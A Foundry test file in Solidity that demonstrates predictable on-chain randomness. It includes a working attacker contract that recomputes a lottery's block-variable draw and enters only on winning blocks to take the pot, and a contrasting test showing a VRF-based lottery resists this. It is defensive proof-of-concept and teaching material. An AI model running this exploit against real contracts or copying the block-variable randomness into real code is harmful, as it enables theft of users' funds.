// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableLottery, SafeLottery} from "../src/randomness/Lottery.sol";

/// Attacker contract: recomputes the lottery's "random" draw and only enters on a winning block.
contract LotteryAttacker {
    VulnerableLottery public lottery;

    constructor(VulnerableLottery l) payable {
        lottery = l;
    }

    function attack() external {
        uint256 rand =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))) % 2;
        require(rand == 0, "skip: this block would lose"); // attacker simply doesn't submit
        lottery.play{value: 1 ether}();
    }

    receive() external payable {}
}

/// PoC for predictable on-chain randomness (NFT mint / lottery class).
///   forge test --match-contract InsecureRandomness -vvv
///
/// Invariant (SC09): the outcome of a draw must not be computable or influenceable by a
/// participant at the time they commit. Block-variable RNG breaks it; externally-supplied
/// randomness (VRF) holds.
///
/// See docs/exploits/insecure-randomness.md
contract InsecureRandomnessTest is Test {
    function test_vulnerable_attackerOnlyEntersWinningBlocks() public {
        VulnerableLottery lottery = new VulnerableLottery{value: 10 ether}();
        LotteryAttacker att = new LotteryAttacker{value: 1 ether}(lottery);

        // The attacker submits only in a block it has precomputed as a win (modeling tx timing).
        bool won;
        for (uint256 i = 0; i < 16 && !won; i++) {
            try att.attack() {
                won = true;
            } catch {
                vm.warp(block.timestamp + 1); // wait for a winning block
            }
        }

        assertTrue(won, "attacker located a winning block");
        // Started with 1 ether, paid a 1-ether ticket, received prize(10)+ticket(1) = 11.
        assertEq(address(att).balance, 11 ether, "attacker took the pot with zero risk");
    }

    function test_safe_externalRandomness_cannotBeForced() public {
        address vrf = makeAddr("vrf");
        SafeLottery lottery = new SafeLottery{value: 9 ether}(vrf);

        address attacker = makeAddr("attacker");
        address h1 = makeAddr("h1");
        address h2 = makeAddr("h2");
        vm.deal(attacker, 1 ether);
        vm.deal(h1, 1 ether);
        vm.deal(h2, 1 ether);

        // Everyone commits blind — there is no block-var draw to condition entry on.
        vm.prank(attacker);
        lottery.play{value: 1 ether}();
        vm.prank(h1);
        lottery.play{value: 1 ether}();
        vm.prank(h2);
        lottery.play{value: 1 ether}(); // players = [attacker, h1, h2]

        // The attacker cannot settle (only the VRF coordinator can).
        vm.prank(attacker);
        vm.expectRevert(bytes("only vrf"));
        lottery.settle(0);

        // The VRF supplies a word that lands on h1 (index 1): the attacker loses despite entering.
        vm.prank(vrf);
        address winner = lottery.settle(1);
        assertEq(winner, h1, "winner chosen by external randomness");
        assertTrue(winner != attacker, "attacker could not force a win");
        assertEq(h1.balance, 12 ether, "winner receives prize + all tickets");
    }
}
